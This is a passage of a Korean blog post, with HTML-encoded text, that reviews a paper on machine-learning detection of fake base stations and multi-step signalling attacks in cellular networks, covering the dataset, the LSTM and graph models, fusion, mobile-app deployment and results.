&#xD3EC;&#xD568;</li></ul><p>&#xACF5;&#xACA9;&#xC790; &#xB2A5;&#xB825; &#xB808;&#xBCA8;&#xB3C4; &#xAF64; &#xAD6C;&#xCCB4;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><strong>0&#xB2E8;&#xACC4;</strong>: &#x201C;&#xB192;&#xC740; &#xC2E0;&#xD638; &#xAC15;&#xB3C4;&#xB85C; &#xB2E8;&#xC21C; &#xC6B4;&#xC601;&#x201D;</li><li><strong>1&#xB2E8;&#xACC4;</strong>: &#x201C;&#xD578;&#xB4DC;&#xC624;&#xBC84;/&#xC7AC;&#xC120;&#xD0DD; &#xC720;&#xB3C4;&#xD558;&#xAE30; &#xB531; &#xC88B;&#xC740; &#xC138;&#xAE30;&#xB85C;&#x201D;</li><li><strong>2&#xB2E8;&#xACC4;</strong>: &#xD569;&#xBC95; BS &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB4E4;(&#xC140;ID, MCC/MNC, TAC, PCI, RF &#xD30C;&#xB77C;&#xBBF8;&#xD130;, SSB/TA &#xB4F1;)&#xAE4C;&#xC9C0; &#xBCF5;&#xC81C;</li><li><strong>3&#xB2E8;&#xACC4;</strong>: 2&#xB2E8;&#xACC4; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC778; MSA &#xC218;&#xD589;</li><li><strong>4&#xB2E8;&#xACC4;</strong>: &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C; &#xBAA9;&#xC801;&#xC758; <strong>&#xD544;&#xB4DC; &#xBCC0;&#xACBD;/&#xC2DC;&#xAC04; &#xC21C;&#xC11C; &#xBCC0;&#xACBD;</strong> &#xB4F1; &#xC801;&#xC751;&#xD615; &#xC7AC;&#xAD6C;&#xC131;</li></ul><h3 id="3-1-&#xB370;&#xC774;&#xD130;-&#xC0DD;&#xC131;-POWDER&#xC5D0;&#xC11C;-&#xBB34;&#xC5C7;&#xC744;-&#xD588;&#xB294;&#xAC00;"><a href="#3-1-&#xB370;&#xC774;&#xD130;-&#xC0DD;&#xC131;-POWDER&#xC5D0;&#xC11C;-&#xBB34;&#xC5C7;&#xC744;-&#xD588;&#xB294;&#xAC00;" class="headerlink" title="3-1. &#xB370;&#xC774;&#xD130; &#xC0DD;&#xC131;(POWDER&#xC5D0;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xD588;&#xB294;&#xAC00;)"></a>3-1. &#xB370;&#xC774;&#xD130; &#xC0DD;&#xC131;(POWDER&#xC5D0;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xD588;&#xB294;&#xAC00;)</h3><p>&#xB17C;&#xBB38;&#xC740; POWDER&#xC5D0;&#xC11C; &#xD569;&#xBC95;&#xC801;&#xC778; BS/FBS &#xBC0F; MSA&#xB97C; &#xD1B5;&#xD569;&#xD55C; &#xC140;&#xB8F0;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0;, <strong>&#xBAA8;&#xB4E0; &#xC140;&#xB8F0;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xD328;&#xD0B7;&#xC744; &#xCEA1;&#xCC98;</strong>&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB3D9;&#xC131;(UE&#xAC00; &#xC774;&#xB3D9;&#xD558;&#xBA70; &#xD578;&#xB4DC;&#xC624;&#xBC84;&#xAC00; &#xC77C;&#xC5B4;&#xB098;&#xB294; &#xC0C1;&#xD669;)&#xC744; &#xB370;&#xC774;&#xD130;&#xC14B;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xB294; &#xC774;&#xC720;&#xB3C4; &#xBD84;&#xBA85;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <strong>&#xC815;&#xC0C1; &#xD578;&#xB4DC;&#xC624;&#xBC84;&#xAC00; &#xC545;&#xC131;&#xC73C;&#xB85C; &#xC624;&#xC778;&#xB420; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAD6C;&#xD604; &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xB294; &#xCF54;&#xC5B4; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB85C; <strong>Open5GS</strong>, UE/BS &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; <strong>srsRAN</strong>&#xACFC; <strong>OpenAirInterface(OAI)</strong> &#xB97C; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xAD6C;&#xD604; &#xD3B8;&#xD5A5;&#xC744; &#xC904;&#xC774;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-&#xC804;&#xCC98;&#xB9AC;-&#xD504;&#xB85C;&#xD1A0;&#xCF5C;-&#xD544;&#xD130;&#xB9C1;&#xACFC;-&#xD2B9;&#xC9D5;"><a href="#3-2-&#xC804;&#xCC98;&#xB9AC;-&#xD504;&#xB85C;&#xD1A0;&#xCF5C;-&#xD544;&#xD130;&#xB9C1;&#xACFC;-&#xD2B9;&#xC9D5;" class="headerlink" title="3-2. &#xC804;&#xCC98;&#xB9AC;(&#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD544;&#xD130;&#xB9C1;&#xACFC; &#xD2B9;&#xC9D5;)"></a>3-2. &#xC804;&#xCC98;&#xB9AC;(&#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD544;&#xD130;&#xB9C1;&#xACFC; &#xD2B9;&#xC9D5;)</h3><p>&#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xC758; &#xAC01; &#xD328;&#xD0B7;&#xC5D0;&#xB294; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC815;&#xBCF4;&#xAC00; &#xC11E;&#xC5EC; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB17C;&#xBB38;&#xC740; <strong>NAS/RRC&#xB9CC; &#xB0A8;&#xAE30;&#xB3C4;&#xB85D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD544;&#xD130;&#xB9C1;</strong>&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xADF8; &#xB4A4;&#xC5D0; &#xAD00;&#xB828; &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>NAS &#xACC4;&#xCE35;</strong>: 119&#xAC1C; &#xD544;&#xB4DC;</li><li><strong>RRC &#xACC4;&#xCE35;</strong>: 183&#xAC1C; &#xD544;&#xB4DC;</li></ul><p>&#xC774; &#xD544;&#xB4DC;&#xB4E4;&#xC774; &#xBAA8;&#xB378; &#xD559;&#xC2B5;&#xC5D0;&#xC11C;&#xC758; &#xC785;&#xB825; &#xD2B9;&#xC9D5;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="3-3-&#xB808;&#xC774;&#xBE14;&#xB9C1;-&#xC815;&#xC0C1;-&#xC545;&#xC131;-&#xADF8;&#xB9AC;&#xACE0;-&#xACF5;&#xACA9;-&#xC885;&#xB958;"><a href="#3-3-&#xB808;&#xC774;&#xBE14;&#xB9C1;-&#xC815;&#xC0C1;-&#xC545;&#xC131;-&#xADF8;&#xB9AC;&#xACE0;-&#xACF5;&#xACA9;-&#xC885;&#xB958;" class="headerlink" title="3-3. &#xB808;&#xC774;&#xBE14;&#xB9C1;(&#xC815;&#xC0C1;/&#xC545;&#xC131;, &#xADF8;&#xB9AC;&#xACE0; &#xACF5;&#xACA9; &#xC885;&#xB958;)"></a>3-3. &#xB808;&#xC774;&#xBE14;&#xB9C1;(&#xC815;&#xC0C1;/&#xC545;&#xC131;, &#xADF8;&#xB9AC;&#xACE0; &#xACF5;&#xACA9; &#xC885;&#xB958;)</h3><p>&#xB808;&#xC774;&#xBE14;&#xB9C1;&#xC740; &#x201C;&#xD328;&#xD0B7;&#xC774; &#xC65C; &#xC0DD;&#xC131;&#xB410;&#xB294;&#xAC00;&#x201D;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>FBSAD(&#xC774;&#xC9C4; &#xB808;&#xC774;&#xBE14;)</strong>: &#xC815;&#xC0C1; &#xD328;&#xD0B7;&#xC774;&#xBA74; 0, FBS&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xD328;&#xD0B7;&#xC774;&#xBA74; 1</li><li><strong>MSAD(&#xBA40;&#xD2F0;&#xD074;&#xB798;&#xC2A4; &#xB808;&#xC774;&#xBE14;)</strong>: &#xC815;&#xC0C1; &#xD328;&#xD0B7;&#xC740; 0, &#xACF5;&#xACA9; (<code>attack_j</code>) &#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xD328;&#xD0B7;&#xC740; <code>LA[attack_j]</code>&#xB85C; &#xB77C;&#xBCA8;&#xB9C1;</li></ul><p>NAS &#xD328;&#xD0B7;&#xC740; &#xC218;&#xAC00; &#xC801;&#xC5B4; &#xAC01; &#xD328;&#xD0B7;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA70; &#xC218;&#xB3D9; &#xB808;&#xC774;&#xBE14;&#xB9C1;&#xD588;&#xACE0;(&#xB17C;&#xBB38;&#xC740; &#xC57D; 2&#xC2DC;&#xAC04; &#xC218;&#xC900;&#xC758; &#xC77C;&#xD68C;&#xC131; &#xC791;&#xC5C5;), RRC &#xD328;&#xD0B7;&#xC740; NAS &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xACF5;&#xACA9; &#xAD6C;&#xAC04;&#xC744; &#xD0D0;&#xC9C0;&#xD55C; &#xB4A4; &#xADF8; &#xAD6C;&#xAC04;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC790;&#xB3D9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xBC30;&#xCE58; &#xB808;&#xC774;&#xBE14;&#xB9C1;&#xD569;&#xB2C8;&#xB2E4;.</p><hr><h2 id="4-FBS-&#xD0D0;&#xC9C0;-2&#xB2E8;&#xACC4;-&#xD328;&#xD0B7;-&#x2192;-&#xD2B8;&#xB808;&#xC774;&#xC2A4;"><a href="#4-FBS-&#xD0D0;&#xC9C0;-2&#xB2E8;&#xACC4;-&#xD328;&#xD0B7;-&#x2192;-&#xD2B8;&#xB808;&#xC774;&#xC2A4;" class="headerlink" title="4. FBS &#xD0D0;&#xC9C0;: 2&#xB2E8;&#xACC4;(&#xD328;&#xD0B7; &#x2192; &#xD2B8;&#xB808;&#xC774;&#xC2A4;)"></a>4. FBS &#xD0D0;&#xC9C0;: 2&#xB2E8;&#xACC4;(&#xD328;&#xD0B7; &#x2192; &#xD2B8;&#xB808;&#xC774;&#xC2A4;)</h2><p>&#xB17C;&#xBB38;&#xC758; &#xC9C1;&#xAD00;&#xC774; &#xC88B;&#xC558;&#xB358; &#xBD80;&#xBD84;&#xC740; &#x201C;&#xD328;&#xD0B7;&#xC774; &#xC545;&#xC131;&#xC774;&#xB77C;&#xAE30;&#xBCF4;&#xB2E4;, <strong>&#xD328;&#xD0B7;&#xC774; &#xB4F1;&#xC7A5;&#xD55C; &#xB9E5;&#xB77D;(&#xC804;&#xD6C4; &#xBB38;&#xB9E5;/&#xC2DC;&#xD000;&#xC2A4;)</strong> &#xC774; &#xC545;&#xC131;&#xC77C; &#xB54C;&#xAC00; &#xB9CE;&#xB2E4;&#x201D;&#xB294; &#xC810;&#xC744; &#xBC18;&#xC601;&#xD588;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; FBS &#xD0D0;&#xC9C0;&#xB294; 2&#xB2E8;&#xACC4;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xD328;&#xD0B7; &#xC218;&#xC900; &#xBD84;&#xB958;</strong></li></ol><ul><li>&#xAC01; &#xD328;&#xD0B7;&#xC744; &#xC815;&#xC0C1;/&#xC758;&#xC2EC;&#xC73C;&#xB85C; &#xBD84;&#xB958;</li><li><strong>Stateful LSTM + Attention</strong> &#xAD6C;&#xC870;&#xB97C; &#xBCD1;&#xB82C;&#xB85C; &#xB450;&#xACE0; &#xACB0;&#xD569;&#xD574; &#xC608;&#xCE21;</li></ul><ol><li><strong>&#xD2B8;&#xB808;&#xC774;&#xC2A4; &#xC218;&#xC900; &#xBD84;&#xB958;</strong></li></ol><ul><li>&#xD328;&#xD0B7; &#xC2DC;&#xD000;&#xC2A4;&#xC758; &#xC21C;&#xC11C;/&#xD328;&#xD134;&#xC744; &#xBCF4;&#xACE0; &#x201C;&#xC774; &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xAC00; FBS &#xC138;&#xC158;&#xC778;&#xAC00;?&#x201D;&#xB97C; &#xCD5C;&#xC885; &#xD310;&#xB2E8;</li><li>&#xD328;&#xD0B7; &#xD558;&#xB098;&#xB9CC; &#xC545;&#xC131;&#xC73C;&#xB85C; &#xCC0D;&#xC73C;&#xBA74; &#xD2B8;&#xB808;&#xC774;&#xC2A4; &#xC804;&#xCCB4;&#xB97C; &#xC545;&#xC131; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB2E8;&#xC21C; &#xD734;&#xB9AC;&#xC2A4;&#xD2F1;&#xC744; &#xD53C;&#xD568;</li></ul><p>&#xB17C;&#xBB38; &#xC124;&#xBA85;&#xC744; &#xC870;&#xAE08; &#xB354; &#xBD99;&#xC774;&#xBA74;, &#xD328;&#xD0B7; &#xC218;&#xC900; &#xBAA8;&#xB378;&#xC740; <strong>stateful LSTM</strong>&#xC5D0;&#xC11C; &#xBC30;&#xCE58; &#xAC04; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xC9C0;&#xD574; &#xC7A5;&#xAE30; &#xC758;&#xC874;&#xC131;&#xC744; &#xBCF4;&#xC874;&#xD558;&#xACE0;, <strong>attention</strong>&#xC740; &#xC2DC;&#xD000;&#xC2A4; &#xC911; &#xBD84;&#xB958;&#xC5D0; &#xACB0;&#xC815;&#xC801;&#xC778; &#xBD80;&#xBD84;&#xC5D0; &#xAC00;&#xC911;&#xCE58;&#xB97C; &#xB450;&#xC5B4; &#xD559;&#xC2B5;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xCD9C;&#xB825;&#xC744; &#xBCD1;&#xB82C;&#xB85C; &#xBF51;&#xC544; &#xACB0;&#xD569;(concat/merge)&#xD558;&#xACE0; dense &#xB808;&#xC774;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xCD5C;&#xC885; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD2B9;&#xD788; &#xC2DC;&#xD000;&#xC2A4; &#xAE38;&#xC774;&#xC5D0; &#xB530;&#xB77C; &#xC131;&#xB2A5;&#xC774; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xBD84;&#xC11D;&#xC774; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;(&#xADF8;&#xB9AC;&#xACE0; &#xC2E4;&#xC81C;&#xB85C; &#xBAA8;&#xB378; &#xD29C;&#xB2DD;&#xD560; &#xB54C; &#xC81C;&#xC77C; &#xB9CE;&#xC774; &#xD5E4;&#xB9E4;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xAE30;&#xB3C4; &#xD558;&#xACE0;&#xC694;).</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure6_sequence_length.png" alt="Figure 6: &#xC2DC;&#xD000;&#xC2A4; &#xAE38;&#xC774; &#xBD84;&#xD3EC; &#xBC0F; &#xC131;&#xB2A5;"></p><p>Figure 6: &#xC2DC;&#xD000;&#xC2A4; &#xAE38;&#xC774; &#xBD84;&#xD3EC; &#xBC0F; &#xC131;&#xB2A5;</p><p><em>&#xADF8;&#xB9BC; 6: NAS&#xB294; 9~15, RRC&#xB294; 80~120 &#xC2DC;&#xD000;&#xC2A4; &#xAE38;&#xC774;&#xC5D0;&#xC11C; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC544;&#xC9C0;&#xB294; &#xACBD;&#xD5A5;</em></p><hr><h2 id="5-MSA-&#xC778;&#xC2DD;-&#xADF8;&#xB798;&#xD504;&#xB85C;-&#x201C;&#xD328;&#xD134;&#x201D;&#xC744;-&#xD559;&#xC2B5;&#xD558;&#xAE30;"><a href="#5-MSA-&#xC778;&#xC2DD;-&#xADF8;&#xB798;&#xD504;&#xB85C;-&#x201C;&#xD328;&#xD134;&#x201D;&#xC744;-&#xD559;&#xC2B5;&#xD558;&#xAE30;" class="headerlink" title="5. MSA &#xC778;&#xC2DD;: &#xADF8;&#xB798;&#xD504;&#xB85C; &#x201C;&#xD328;&#xD134;&#x201D;&#xC744; &#xD559;&#xC2B5;&#xD558;&#xAE30;"></a>5. MSA &#xC778;&#xC2DD;: &#xADF8;&#xB798;&#xD504;&#xB85C; &#x201C;&#xD328;&#xD134;&#x201D;&#xC744; &#xD559;&#xC2B5;&#xD558;&#xAE30;</h2><p>MSA&#xB294; &#x201C;&#xBA54;&#xC2DC;&#xC9C0; &#xBA87; &#xAC1C;&#x201D;&#xAC00; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xC808;&#xCC28;&#xAC00; &#xC5EE;&#xC778; &#xD328;&#xD134;</strong>&#xC5D0; &#xAC00;&#xAE5D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB17C;&#xBB38;&#xC740; &#xC774;&#xB97C; &#xADF8;&#xB798;&#xD504;&#xB85C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB178;&#xB4DC;: &#xBA54;&#xC2DC;&#xC9C0; &#xD0C0;&#xC785;(&#xC608;: NAS&#xBA74; <code>nas_eps_nas_msg_emm_type_value</code>, RRC&#xBA74; <code>lterrc_c1_showname</code>)&#xC758; &#xACE0;&#xC720; &#xAC12;</li><li>&#xC5E3;&#xC9C0;: &#xB2E4;&#xC74C; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C;&#xC758; &#xC804;&#xD658;(&#xBC29;&#xD5A5;&#xC131;), &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xC804;&#xD658;&#xC774; &#xC815;&#xC0C1;/&#xACF5;&#xACA9;&#xC778;&#xC9C0; &#xB808;&#xC774;&#xBE14;</li></ul><p>&#xC774;&#xB807;&#xAC8C; &#xB9CC;&#xB4E0; &#xADF8;&#xB798;&#xD504;&#xC5D0;&#xC11C; GraphSAGE&#xAC00; &#xAC00;&#xC7A5; &#xC88B;&#xC740; &#xC131;&#xB2A5;&#xC774;&#xB77C; &#xD574;&#xB2F9; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure3_graph_msa_detection.png" alt="Figure 3: MSA &#xD0D0;&#xC9C0;&#xB97C; &#xC704;&#xD55C; &#xADF8;&#xB798;&#xD504; &#xD45C;&#xD604; &#xC608;&#xC2DC;"></p><p>Figure 3: MSA &#xD0D0;&#xC9C0;&#xB97C; &#xC704;&#xD55C; &#xADF8;&#xB798;&#xD504; &#xD45C;&#xD604; &#xC608;&#xC2DC;</p><p>&#xADF8;&#xB9BC; 3: TAU Reject&#xC640; &#xAC19;&#xC740; &#xACF5;&#xACA9;&#xC774; &#x201C;&#xACBD;&#xB85C; &#xD328;&#xD134;&#x201D;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xACE0;, &#xACB0;&#xAD6D; &#xC774; &#xD328;&#xD134;&#xC744; &#xD559;&#xC2B5;&#xD574;&#xC11C; MSA&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#x201C;&#xACF5;&#xACA9;&#xC774; &#xC9C4;&#xD654;&#xD558;&#xBA74;?&#x201D; &#xBB38;&#xC81C;&#xB97C; &#xC704;&#xD574; <strong>&#xCD5C;&#xB300; &#xC911;&#xCCA9; &#xBD80;&#xBD84; &#xADF8;&#xB798;&#xD504;</strong> &#xAC19;&#xC740; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB85C; &#x201C;&#xC644;&#xC804;&#xD788; &#xC0C8; &#xACBD;&#xB85C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xC77C;&#xBD80;&#xB294; &#xACB9;&#xCE5C;&#xB2E4;&#x201D;&#xB294; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD0D0;&#xC9C0;&#xD558;&#xACA0;&#xB2E4;&#xB294; &#xBC29;&#xD5A5;&#xC744; &#xC81C;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB17C;&#xBB38;&#xC740; &#xC774;&#xB97C; &#xC880; &#xB354; &#xD615;&#xC2DD;&#xC801;&#xC73C;&#xB85C;&#xB3C4; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD0B7;&#xC73C;&#xB85C; &#xB9CC;&#xB4E0; &#xADF8;&#xB798;&#xD504;&#xB97C; (G=(V,E)) &#xB77C;&#xACE0; &#xD558;&#xBA74;, &#xC54C;&#xB824;&#xC9C4; &#xACF5;&#xACA9;&#xC740; &#xADF8;&#xB798;&#xD504; &#xC548;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xACBD;&#xB85C; (P(G)) &#xB85C; &#xB098;&#xD0C0;&#xB098;&#xACE0;, &#xC9C4;&#xD654;/&#xC7AC;&#xAD6C;&#xC131;&#xB41C; &#xACF5;&#xACA9;&#xC740; &#xB2E4;&#xB978; &#xACBD;&#xB85C; (P&#x2019;(G)) &#xB85C; &#xB098;&#xD0C0;&#xB0A0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xCDE8;&#xC57D;&#xC810;/&#xC808;&#xCC28; &#xD2B9;&#xC131;&#xC0C1; &#xC644;&#xC804;&#xD788; &#xBD84;&#xB9AC;&#xB41C; &#xACBD;&#xB85C;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xC77C;&#xBD80;&#xAC00; &#xACB9;&#xCE60; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xACE0;, &#xC774; &#x201C;&#xACB9;&#xCE68;&#x201D;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC54C;&#xB824;&#xC9C0;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xB3C4; &#xD0D0;&#xC9C0;&#xD558;&#xACA0;&#xB2E4;&#xB294; &#xC9C1;&#xAD00;&#xC785;&#xB2C8;&#xB2E4;.</p><hr><h2 id="6-NAS-RRC-&#xC608;&#xCE21;-&#xACB0;&#xD569;-&#xAC00;&#xC911;&#xCE58;-&#xAE30;&#xBC18;-&#xC735;&#xD569;"><a href="#6-NAS-RRC-&#xC608;&#xCE21;-&#xACB0;&#xD569;-&#xAC00;&#xC911;&#xCE58;-&#xAE30;&#xBC18;-&#xC735;&#xD569;" class="headerlink" title="6. NAS/RRC &#xC608;&#xCE21; &#xACB0;&#xD569; (&#xAC00;&#xC911;&#xCE58; &#xAE30;&#xBC18; &#xC735;&#xD569;)"></a>6. NAS/RRC &#xC608;&#xCE21; &#xACB0;&#xD569; (&#xAC00;&#xC911;&#xCE58; &#xAE30;&#xBC18; &#xC735;&#xD569;)</h2><p>NAS&#xC640; RRC&#xB294; &#xAC01;&#xAC01; &#xD2B9;&#xC9D5;&#xC774; &#xB2E4;&#xB974;&#xB2C8; &#xBAA8;&#xB378;&#xC744; &#xB530;&#xB85C; &#xD559;&#xC2B5;&#xC2DC;&#xD0A4;&#xACE0;, &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; <strong>&#xAC00;&#xC911;&#xCE58; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC608;&#xCE21;&#xC744; &#xC735;&#xD569;</strong>&#xD569;&#xB2C8;&#xB2E4;. (&#xB17C;&#xBB38;&#xC740; Dempster&#x2013;Shafer &#xC774;&#xB860;&#xC744; &#xC5B8;&#xAE09;&#xD558;&#xBA70;, &#xB354; &#xC2E0;&#xB8B0;&#xB3C4; &#xB192;&#xC740; &#xCABD;&#xC5D0; &#xAC00;&#xC911;&#xCE58;&#xB97C; &#xC8FC;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.)</p><p>&#xC2E4;&#xD5D8;&#xC801;&#xC73C;&#xB85C;&#xB3C4; NAS+RRC &#xC608;&#xCE21; &#xACB0;&#xD569;&#xC774; 1~2% &#xC815;&#xB3C4; &#xC131;&#xB2A5;&#xC744; &#xC62C;&#xB824;&#xC92C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><hr><h2 id="7-Deployment-&#xBAA8;&#xBC14;&#xC77C;-&#xC571;&#xC73C;&#xB85C;-&#xBC30;&#xD3EC;"><a href="#7-Deployment-&#xBAA8;&#xBC14;&#xC77C;-&#xC571;&#xC73C;&#xB85C;-&#xBC30;&#xD3EC;" class="headerlink" title="7. Deployment: &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC73C;&#xB85C; &#xBC30;&#xD3EC;"></a>7. Deployment: &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC73C;&#xB85C; &#xBC30;&#xD3EC;</h2><p>&#xC2E4;&#xD5D8;&#xC5D0;&#xC11C;&#xB9CC; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xACE0;, &#xC571;&#xC73C;&#xB85C; &#xBC30;&#xD3EC;&#xD574;&#xC11C; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAE4C;&#xC9C0; &#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>MobileInsight</strong>: &#xBCA0;&#xC774;&#xC2A4;&#xBC34;&#xB4DC; &#xD2B8;&#xB808;&#xC774;&#xC2A4; &#xD30C;&#xC2F1;</li><li><strong>TensorFlow Lite</strong>: &#xC628;&#xB514;&#xBC14;&#xC774;&#xC2A4; &#xCD94;&#xB860;</li><li><strong>Flutter</strong>: &#xC571; UI</li></ul><p>&#xB8E8;&#xD305; &#xC694;&#xAD6C;&#xC0AC;&#xD56D; &#xB4F1; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xC7A5;&#xBCBD;&#xB3C4; &#xAC19;&#xC774; &#xC5B8;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC2E4;&#xC81C; &#xBC30;&#xD3EC;&#xB97C; &#xAC00;&#xC815;&#xD558;&#xBA74; &#xC0C8;&#xB85C;&#xC6B4; &#xACF5;&#xACA9;&#xC744; &#xBC18;&#xC601;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBAA8;&#xB378;&#xC744; &#xC8FC;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xC7AC;&#xD559;&#xC2B5;&#xD558;&#xACE0;, &#xC571; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB85C; &#xBE60;&#xB974;&#xAC8C; &#xBC30;&#xD3EC;&#xD558;&#xB294; &#xC6B4;&#xC601; &#xD615;&#xD0DC;&#xB97C; &#xC608;&#xC0C1;&#xD569;&#xB2C8;&#xB2E4;. NAS/RRC &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xAC00; &#xBBFC;&#xAC10;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB370;&#xC774;&#xD130; &#xC218;&#xC9D1;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xB3D9;&#xC758; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB3FC;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC810;&#xB3C4; &#xD568;&#xAED8; &#xB2E4;&#xB8F9;&#xB2C8;&#xB2E4;.</p><hr><h1 id="Performance-Analysis"><a href="#Performance-Analysis" class="headerlink" title="Performance Analysis"></a>Performance Analysis</h1><p>&#xD575;&#xC2EC; &#xACB0;&#xACFC;&#xB9CC; &#xBA3C;&#xC800; &#xC694;&#xC57D;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>FBS &#xD0D0;&#xC9C0;</strong>: &#xC815;&#xD655;&#xB3C4; 96%, FPR 2.96%</li><li><strong>MSA &#xC778;&#xC2DD;(21&#xAC1C;)</strong>: &#xC815;&#xD655;&#xB3C4; 86%, FPR 3.28%</li><li>NAS/RRC 